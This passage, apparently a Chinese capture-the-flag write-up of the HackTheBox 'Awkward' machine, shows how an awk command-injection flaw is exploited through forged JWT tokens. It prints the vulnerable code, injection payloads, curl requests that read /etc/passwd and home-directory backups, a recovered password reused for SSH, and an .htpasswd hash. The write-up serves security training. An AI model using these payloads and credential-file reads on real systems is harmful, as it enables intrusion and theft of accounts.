<p>3002æ˜¯APIæ–‡ä»¶ï¼Œè®°å½•äº†ç«™ç‚¹çš„APIä¿¡æ¯åŠå…¶æºç ï¼ŒAPIåç§°å¦‚ä¸‹</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Login (/api/login)
Submit Leave (/api/submit-leave)
All Leave (/api/all-leave)
Store Status (/api/store-status)
Staff Details (/api/staff-details)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303133933056.png"></p>
<p>8080é¡µé¢ç©ºç™½ï¼Œçœ‹æºç å‘ç°hat-valleyä¸èƒ½æ­£å¸¸å·¥ä½œï¼Œè¦æ±‚å¼€å¯JavaScriptæ‰èƒ½æ­£å¸¸å·¥ä½œï¼Œæ²¡ä»€ä¹ˆç”¨</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303134214112.png"></p>
<h2 id="å››ã€LFI"><a href="#å››ã€LFI" class="headerlink" title="å››ã€LFI"></a>å››ã€LFI</h2><p>åœ¨å…¶ä¸­ä¸€ä¸ªAPIæºç å‘ç°æ¼æ´ç‚¹ï¼Œåœ¨28è¡Œexecå‡½æ•°é‡Œï¼Œæœ‰ç”¨æˆ·å¯æ§çš„å‚æ•°userï¼Œé€šè¿‡æ“çºµå‚æ•°userï¼Œæ‰§è¡Œ<a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-awk.html">awkå‘½ä»¤</a>è¯»å–æ–‡ä»¶ï¼ˆPSï¼šé¢˜ç›®åç§°AwkwardåŸæ¥ä½“ç°åœ¨è¿™ï¼‰ã€‚è€Œuserå€¼çš„è·å–ï¼Œå¾€å‰è¿½æº¯ä»£ç ï¼Œå‘ç°æ˜¯é€šè¿‡decodedTokenï¼Œç„¶åå–usernameå­—æ®µå¾—åˆ°çš„ã€‚</p>
<p>å†å¾€å‰è¿½æº¯åˆ°å¤´ï¼Œå‘ç°æ˜¯å¦‚ä¸‹å›¾æ‰€ç¤ºçš„ä¼ é€’é“¾ï¼ŒTOKEN_SECRETå‰é¢å·²ç»è·å¾—ï¼Œå€¼ä¸º<code>123beany123</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡JWTä¼ªé€ è¯·æ±‚å¤´ä¸­Cookieå­—æ®µçš„tokenå€¼ï¼Œä»è€Œæ“çºµuserå€¼è¯»å–æ–‡ä»¶</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303161247753.png"></p>
<pre class="line-numbers language-apl" data-language="apl"><code class="language-apl">app<span class="token dyadic-operator operator">.</span>get<span class="token punctuation">(</span><span class="token string">'/api/all-leave'</span><span class="token function">,</span> <span class="token punctuation">(</span>req<span class="token function">,</span> res<span class="token punctuation">)</span> <span class="token function">=</span><span class="token function">&gt;</span> <span class="token dfn builtin">{</span>
  const user_token <span class="token function">=</span> req<span class="token dyadic-operator operator">.</span>cookies<span class="token dyadic-operator operator">.</span>token
  var authFailed <span class="token function">=</span> false
  var user <span class="token function">=</span> null
  if<span class="token punctuation">(</span>user_token<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
    const decodedToken <span class="token function">=</span> jwt<span class="token dyadic-operator operator">.</span>verify<span class="token punctuation">(</span>user_token<span class="token function">,</span> TOKEN_SECRET<span class="token punctuation">)</span>
    if<span class="token punctuation">(</span><span class="token function">!</span>decodedToken<span class="token dyadic-operator operator">.</span>username<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
      authFailed <span class="token function">=</span> true
    <span class="token dfn builtin">}</span>
    else <span class="token dfn builtin">{</span>
      user <span class="token function">=</span> decodedToken<span class="token dyadic-operator operator">.</span>username
    <span class="token dfn builtin">}</span>
  <span class="token dfn builtin">}</span>
  if<span class="token punctuation">(</span>authFailed<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
    return res<span class="token dyadic-operator operator">.</span>status<span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">)</span><span class="token dyadic-operator operator">.</span>json<span class="token punctuation">(</span><span class="token dfn builtin">{</span>Error<span class="token dfn builtin">:</span> "Invalid Token"<span class="token dfn builtin">}</span><span class="token punctuation">)</span>
  <span class="token dfn builtin">}</span>
  if<span class="token punctuation">(</span><span class="token function">!</span>user<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
    return res<span class="token dyadic-operator operator">.</span>status<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token dyadic-operator operator">.</span>send<span class="token punctuation">(</span>"Invalid user"<span class="token punctuation">)</span>
  <span class="token dfn builtin">}</span>
  const bad <span class="token function">=</span> <span class="token punctuation">[</span>"<span class="token punctuation">;</span>"<span class="token function">,</span>"<span class="token monadic-operator operator">&amp;</span>"<span class="token function">,</span>"<span class="token function">|</span>"<span class="token function">,</span>"<span class="token function">&gt;</span>"<span class="token function">,</span>"<span class="token function">&lt;</span>"<span class="token function">,</span>"<span class="token function">*</span>"<span class="token function">,</span>"<span class="token function">?</span>"<span class="token function">,</span>"`"<span class="token function">,</span>"$"<span class="token function">,</span>"<span class="token punctuation">(</span>"<span class="token function">,</span>"<span class="token punctuation">)</span>"<span class="token function">,</span>"<span class="token dfn builtin">{</span>"<span class="token function">,</span>"<span class="token dfn builtin">}</span>"<span class="token function">,</span>"<span class="token punctuation">[</span>"<span class="token function">,</span>"<span class="token punctuation">]</span>"<span class="token function">,</span>"<span class="token function">!</span>"<span class="token function">,</span>"<span class="token constant">#</span>"<span class="token punctuation">]</span>

  const badInUser <span class="token function">=</span> bad<span class="token dyadic-operator operator">.</span>some<span class="token punctuation">(</span>char <span class="token function">=</span><span class="token function">&gt;</span> user<span class="token dyadic-operator operator">.</span>includes<span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  if<span class="token punctuation">(</span>badInUser<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
    return res<span class="token dyadic-operator operator">.</span>status<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token dyadic-operator operator">.</span>send<span class="token punctuation">(</span>"Bad character detected<span class="token dyadic-operator operator">.</span>"<span class="token punctuation">)</span>
  <span class="token dfn builtin">}</span>

  exec<span class="token punctuation">(</span>"awk <span class="token string">'/" + user + "/'</span> <span class="token monadic-operator operator">/</span>var<span class="token monadic-operator operator">/</span>www<span class="token monadic-operator operator">/</span>private<span class="token monadic-operator operator">/</span>leave_requests<span class="token dyadic-operator operator">.</span>csv"<span class="token function">,</span> <span class="token dfn builtin">{</span>encoding<span class="token dfn builtin">:</span> <span class="token string">'binary'</span><span class="token function">,</span> maxBuffer<span class="token dfn builtin">:</span> <span class="token number">51200000</span><span class="token dfn builtin">}</span><span class="token function">,</span> <span class="token punctuation">(</span>error<span class="token function">,</span> stdout<span class="token function">,</span> stderr<span class="token punctuation">)</span> <span class="token function">=</span><span class="token function">&gt;</span> <span class="token dfn builtin">{</span>
    if<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
      return res<span class="token dyadic-operator operator">.</span>status<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token dyadic-operator operator">.</span>send<span class="token punctuation">(</span>new Buffer<span class="token punctuation">(</span>stdout<span class="token function">,</span> <span class="token string">'binary'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token dfn builtin">}</span>
    if <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
      return res<span class="token dyadic-operator operator">.</span>status<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token dyadic-operator operator">.</span>send<span class="token punctuation">(</span>"Failed to retrieve leave requests"<span class="token punctuation">)</span>
    <span class="token dfn builtin">}</span>
    if <span class="token punctuation">(</span>stderr<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
      return res<span class="token dyadic-operator operator">.</span>status<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token dyadic-operator operator">.</span>send<span class="token punctuation">(</span>"Failed to retrieve leave requests"<span class="token punctuation">)</span>
    <span class="token dfn builtin">}</span>

  <span class="token dfn builtin">}</span><span class="token punctuation">)</span>

<span class="token dfn builtin">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å…³é”®ä»£ç </p>
<pre class="line-numbers language-apl" data-language="apl"><code class="language-apl"><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span>
user <span class="token function">=</span> decodedToken<span class="token dyadic-operator operator">.</span>username
<span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span>
exec<span class="token punctuation">(</span>"awk <span class="token string">'/" + user + "/'</span> <span class="token monadic-operator operator">/</span>var<span class="token monadic-operator operator">/</span>www<span class="token monadic-operator operator">/</span>private<span class="token monadic-operator operator">/</span>leave_requests<span class="token dyadic-operator operator">.</span>csv"<span class="token function">,</span> <span class="token dfn builtin">{</span>encoding<span class="token dfn builtin">:</span> <span class="token string">'binary'</span><span class="token function">,</span> maxBuffer<span class="token dfn builtin">:</span> <span class="token number">51200000</span><span class="token dfn builtin">}</span>
<span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ¯”å¦‚æˆ‘ä»¬è®©<code>user=/' /etc/passwd '</code>ï¼Œé‚£ä¹ˆå¾—åˆ°çš„å‘½ä»¤å¦‚ä¸‹</p>
<pre class="line-numbers language-apl" data-language="apl"><code class="language-apl">awk <span class="token string">'//'</span> <span class="token monadic-operator operator">/</span>etc<span class="token monadic-operator operator">/</span>passwd <span class="token string">'/'</span> <span class="token monadic-operator operator">/</span>var<span class="token monadic-operator operator">/</span>www<span class="token monadic-operator operator">/</span>private<span class="token monadic-operator operator">/</span>leave_requests<span class="token dyadic-operator operator">.</span>csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å¯ä»¥åœ¨è‡ªå·±æœ¬åœ°æµ‹è¯•</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303140858571.png"></p>
<p>ç”¨<a target="_blank" rel="noopener" href="https://jwt.io/">JWT Debugger</a>ï¼Œå…ˆå°†è·å–åˆ°çš„tokenå¤åˆ¶åˆ°Encodedæ–‡æœ¬æ¡†é‡Œï¼Œç„¶åä¿®æ”¹Decodedæ–‡æœ¬æ¡†ä¸­usernameå€¼ä¸º<code>/' /etc/passwd '</code>ï¼Œç„¶åå·¦ä¾§Encodedæ–‡æœ¬æ¡†å°±ä¼šå®æ—¶å‡ºç°ä¼ªé€ åçš„tokenå€¼</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303150040606.png"></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2Nzc4MjAwNzN9.TyuC5rH79AtjGs4biOvMhtG0CHRm1HfLfrWqRhylrLk" | grep -i /bin/bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3059  100  3059    0     0   3216      0 --:--:-- --:--:-- --:--:--  3213
root:x:0:0:root:/root:/bin/bash
bean:x:1001:1001:,,,:/home/bean:/bin/bash
christine:x:1002:1002:,,,:/home/christine:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å‘ç°2ä¸ªç”¨æˆ·ï¼Œbeanå’Œchristine</p>
<p>å°è¯•ä¿®æ”¹payloadå¦‚ä¸‹ï¼Œæ‰§è¡Œç±»ä¼¼ä¸Šè¿°çš„å‘½ä»¤</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">{
  "username": "/' /home/bean/.ssh/id_rsa '",
  "iat": 1677820073
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>æŠ¥é”™Failed to retrieve leave requests</p>
<p>ä¿®æ”¹payloadå¦‚ä¸‹</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">{
  "username": "/' /home/christine/.ssh/id_rsa '",
  "iat": 1677820073
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¾ç„¶æŠ¥é”™Failed to retrieve leave requests</p>
<p>ä¿®æ”¹å¦‚ä¸‹</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">{
  "username": "/' /home/bean/.bashrc '",
  "iat": 1677820073
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>æœ‰ä¸œè¥¿äº†</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLmJhc2hyYyAnIiwiaWF0IjoxNjc3ODIwMDczfQ.NJ1ArXnFPdqvtf4K9Exdo34a4r73JZNUlg6VANAW7sQ"                    
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] &amp;&amp; eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] &amp;&amp; [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] &amp;&amp; tput setaf 1 &gt;&amp;/dev/null; then
        # We have color support; assume it's compliant with Ecma-48
        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
        # a case would tend to support setf rather than setaf.)
        color_prompt=yes
    else
        color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors &amp;&amp; eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# custom
alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'

# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] &amp;&amp; echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&amp;|]\s*alert$//'\'')"'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¤§æ¦‚åœ¨98è¡Œï¼Œçœ‹åˆ°æœ‰</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å°è¯•ç”¨JWTå»è¯»<code>/home/bean/Documents/backup_home.sh</code></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cF9ob21lLnNoICciLCJpYXQiOjE2Nzc4MjAwNzN9.FeikFTrIWzIe5LAJnPRZGH_Z7B1RLpfKJ4saxf9T74s"
#!/bin/bash
mkdir /home/bean/Documents/backup_tmp
cd /home/bean
tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
date &gt; /home/bean/Documents/backup_tmp/time.txt
cd /home/bean/Documents/backup_tmp
tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
rm -r /home/bean/Documents/backup_tmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>çœ‹åˆ°æœ‰<code>/home/bean/Documents/backup/bean_backup_final.tar.gz</code></p>
<p>å†ç”¨JWTå»è¯»ï¼Œå¹¶ä¸”ç”¨curlæŠŠä»–è¾“å‡ºåˆ°æœ¬åœ°</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY3NzgyMDA3M30.wArGs4nDtEexKppqgQ1gHSOrq1y91D486JBYTpN4f7E" --output bean_backup_final.zip
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 31716  100 31716    0     0  20265      0  0:00:01  0:00:01 --:--:-- 20265<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>unzipä¸è¡Œï¼Œç›´æ¥åŒå‡»æ‰“å¼€ï¼ŒæŠŠæ–‡ä»¶æ‹–å‡ºæ¥ï¼Œä¾æ¬¡å¾—åˆ°å¦‚ä¸‹å›¾æ–‡ä»¶</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303170423291.png"></p>
<p>è§£å‹bean_backup.tar.gzå¾—åˆ°ä»¥ä¸‹æ–‡ä»¶</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/bean_backup]
â””â”€# ls -la
total 72
drwxr-x--- 15 1001 1001 4096 Sep 15 07:45 .
drwxr-x---  3 1001 1001 4096 Mar  3 04:19 ..
lrwxrwxrwx  1 1001 1001    9 Sep 15 07:40 .bash_history -&gt; /dev/null
-rw-r--r--  1 1001 1001  220 Sep 15 07:34 .bash_logout
-rw-r--r--  1 1001 1001 3847 Sep 15 07:45 .bashrc
drwx------ 12 1001 1001 4096 Sep 15 07:41 .config
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Desktop
drwxr-xr-x  4 1001 1001 4096 Sep 15 07:46 Documents
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Downloads
drwx------  2 1001 1001 4096 Sep 15 07:36 .gnupg
drwx------  3 1001 1001 4096 Sep 15 07:35 .local
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Music
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Pictures
-rw-r--r--  1 1001 1001  807 Sep 15 07:34 .profile
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Public
drwx------  3 1001 1001 4096 Sep 15 07:35 snap
drwx------  2 1001 1001 4096 Sep 15 07:36 .ssh
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Templates
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Videos<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨<code>.config/xpad/content-DS1ZS1</code>æ–‡ä»¶é‡Œå‘ç°ä¸€å¯¹ç–‘ä¼¼ç”¨æˆ·åå¯†ç çš„ä¸œè¥¿ï¼Œæœ€åè¿˜æœ‰ä¸€å¥ï¼Œ<code>MAKE SURE TO USE THIS EVERYWHERE</code>ï¼Œçœ‹æ¥è¿™ä¸ªè´¦æˆ·å¯†ç ä¼šä¸æ­¢ä¸€æ¬¡ç”¨åˆ°ï¼Œç”±æ­¤å¯è§ï¼Œè‹¥æ˜¯åœ¨çœŸå®æ¸—é€ï¼Œå‰æœŸæ”¶é›†çš„èµ„äº§å¯èƒ½åæœŸè¿˜ä¼šç”¨åˆ°ï¼Œæ•´ç†å¥½èµ„äº§ï¼</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean.hill	#è¿æ¥sshæ—¶å‘ç°ç”¨æˆ·åæ˜¯bean
014mrbeanrules!#P<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303172108467.png"></p>
<p>SSHè¿ä¸Šå»</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303172702700.png"></p>
<h2 id="äº”ã€æƒé™æå‡"><a href="#äº”ã€æƒé™æå‡" class="headerlink" title="äº”ã€æƒé™æå‡"></a>äº”ã€æƒé™æå‡</h2><p>æŸ¥çœ‹hostæ–‡ä»¶</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:~$ cat /etc/hosts
127.0.0.1       localhost hat-valley.htb store.hat-valley.htb
127.0.0.1       awkward

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å‘ç°æ–°å­åŸŸåï¼Œæ·»åŠ è¿›æœ¬åœ°hostsæ–‡ä»¶ï¼Œè®¿é—®ï¼Œå‘ç°è¦ç”¨æˆ·åå¯†ç </p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">store.hat-valley.htb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç½‘ç«™æ˜¯nginxæœåŠ¡å™¨ï¼ŒnginxæœåŠ¡å™¨çš„é»˜è®¤ç”¨æˆ·åå¯†ç é€šå¸¸åœ¨<code>/etc/nginx/conf.d/.htaccess</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°è¯•è®¿é—®ï¼Œä½†è®¿é—®ä¸åˆ°ï¼Œå‘ç°æœ‰<code>/etc/nginx/conf.d/.htpasswd</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303173843111.png"></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:~$ cat /etc/nginx/conf.d/.htpasswd
admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>hashå°è¯•å„ç§çˆ†ç ´æ— æœï¼Œæƒ³èµ·ä¹‹å‰çš„<code>MAKE SURE TO USE THIS EVERYWHERE</code>ï¼Œå°è¯•å„ç§ç»„åˆä¹‹åï¼Œå‘ç°ç”¨æˆ·åæ˜¯adminï¼Œå¯†ç æ˜¯beanç”¨æˆ·çš„å¯†ç ï¼ŒæˆåŠŸç™»å…¥</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303174518831.png"></p>
<p>ç»æŸ¥æ‰¾ï¼Œç«™ç‚¹æºç åœ¨<code>/var/www/store</code>ç›®å½•ä¸‹</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:/var/www/store$ ls -la
total 104
drwxr-xr-x 9 root root  4096 Oct  6 01:35 .
drwxr-xr-x 7 root root  4096 Oct  6 01:35 ..
drwxrwxrwx 2 root root  4096 Mar  3 21:30 cart
-rwxr-xr-x 1 root root  3664 Sep 15 20:09 cart_actions.php
-rwxr-xr-x 1 root root 12140 Sep 15 20:09 cart.php
-rwxr-xr-x 1 root root  9143 Sep 15 20:09 checkout.php
drwxr-xr-x 2 root root  4096 Oct  6 01:35 css
drwxr-xr-x 2 root root  4096 Oct  6 01:35 fonts
drwxr-xr-x 6 root root  4096 Oct  6 01:35 img
-rwxr-xr-x 1 root root 14770 Sep 15 20:09 index.php
drwxr-xr-x 3 root root  4096 Oct  6 01:35 js
drwxrwxrwx 2 root root  4096 Mar  3 21:50 product-details
-rwxr-xr-x 1 root root   918 Sep 15 20:09 README.md
-rwxr-xr-x 1 root root 13731 Sep 15 20:09 shop.php
drwxr-xr-x 6 root root  4096 Oct  6 01:35 static
-rwxr-xr-x 1 root root   695 Sep 15 20:09 style.css<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æŸ¥çœ‹<code>README.md</code></p>
<p>æœ‰å‡ ä¸ªä¿¡æ¯</p>
<ol>
<li><p>æ²¡æœ‰æ•°æ®åº“ï¼Œåªæœ‰ç¦»çº¿æ–‡ä»¶</p>
</li>
<li><p><code>/product-details</code>å­˜å‚¨äº§å“ä¿¡æ¯</p>
</li>
<li><p><code>/cart</code>å­˜å‚¨ç”¨æˆ·çš„è´­ç‰©è½¦ä¿¡æ¯ï¼Œå¹¶ä¸”æ ¹æ®ç”¨æˆ·çš„<code>session ID</code>å‘½å</p>
</li>
</ol>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:/var/www/store$ cat README.md                                       
